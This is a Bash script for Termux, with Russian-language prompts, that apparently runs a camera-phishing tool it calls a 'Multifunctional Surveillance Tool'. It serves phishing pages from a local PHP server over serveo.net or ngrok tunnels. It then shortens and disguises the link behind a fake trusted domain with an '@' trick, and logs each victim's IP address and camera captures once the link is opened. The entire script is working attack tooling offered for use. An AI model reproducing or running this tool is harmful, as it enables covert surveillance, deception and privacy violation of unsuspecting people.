
clear
termux-setup-storage
pkg install php -y
pkg install wget -y
clear
trap 'printf "\n";stop' 2

banner() {

echo '
──────────────────────────────────────────────────────
─██████──────────██████─██████████████─██████████████─
─██░░██████████████░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░░░░░░░░░░░░░░░░░██─██░░██████████─██████░░██████─
─██░░██████░░██████░░██─██░░██─────────────██░░██─────
─██░░██──██░░██──██░░██─██░░██████████─────██░░██─────
─██░░██──██░░██──██░░██─██░░░░░░░░░░██─────██░░██─────
─██░░██──██████──██░░██─██████████░░██─────██░░██─────
─██░░██──────────██░░██─────────██░░██─────██░░██─────
─██░░██──────────██░░██─██████████░░██─────██░░██─────
─██░░██──────────██░░██─██░░░░░░░░░░██─────██░░██─────
─██████──────────██████─██████████████─────██████─────
────────────────────────────────────────────────────── 

███████████████████████████████████████
█─▄▄▄─██▀▄─██▄─▀█▀─▄█▄─▄▄─█▄─▄▄▀██▀▄─██
█─███▀██─▀─███─█▄█─███─▄█▀██─▄─▄██─▀─██
▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▀▄▄▀ v 1.0' |lolcat

                                                                               
echo " "
printf "      \e[1;77m  created by https://github.com/gvs3-unkown\e[0m \n"
printf "          \e[1;77m Multifunctional Surveillance Tool(Camera) v1.0\e[0m \n"
printf "      \e[1;77m 9779 9779 9779 9779 9779 9779 9779 97779 97779\e[0m \n"

printf "\n"

echo "      N073:> ПОЖАЛУЙСТА, ВКЛЮЧИТЕ СВОЮ ТОЧКУ ДОСТУПА 
                           ИЛИ ЖЕ ВЫ НЕ ПОЛУЧИТЕ ССЫЛКУ....!"

}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "Мне нужен php, но он не установлен. Установите его."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ожидание цели,\e[0m\e[1;77m Нажмите Ctrl + C, чтобы выйти..\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Цель открыла ссылку!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] файл с камеры получен!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "Мне нужен ssh, но он не установлен. Установите его."; exit 1; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Запуск Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Запуск php-сервера... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] прямая ссылка:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' MST.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "мне нужен unzip, но он не установлен.Установите его"; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "Мне нужен wget, но он не установлен. Установите его"; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Загрузка Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Ошибка загрузки... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Ошибка загрузки... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Запуск php-сервера...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Запуск сервера ngrok...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] прямая ссылка:\e[0m\e[1;77m %s\e[0m\n" $link

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}
echo -n "Вставьте ngrok url сюда(С http или https): "
read phish
url_checker $phish
sleep 1
echo "Модификация ссылки..."
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
echo 'домен для подмены ссылки(С http или https), default: https://youtube.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nВведите СИ слова(Тут по вашей фантазии)'
echo -e "\e[31mНе используйте пробел. Используйте '-' Между СИ словами\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\nГенерация новой ссылки..\n"
final=$mask-$words@$shorter
echo -e "Ваша новая ссылка:\e[32m ${final} \e[0m\n"
payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Выберите опцию переадресации портов: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "Мне нужен ssh, но он не установлен. Установите его."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Недопустимый вариант!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' MST.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="grabcam$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Выбрать поддомен? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

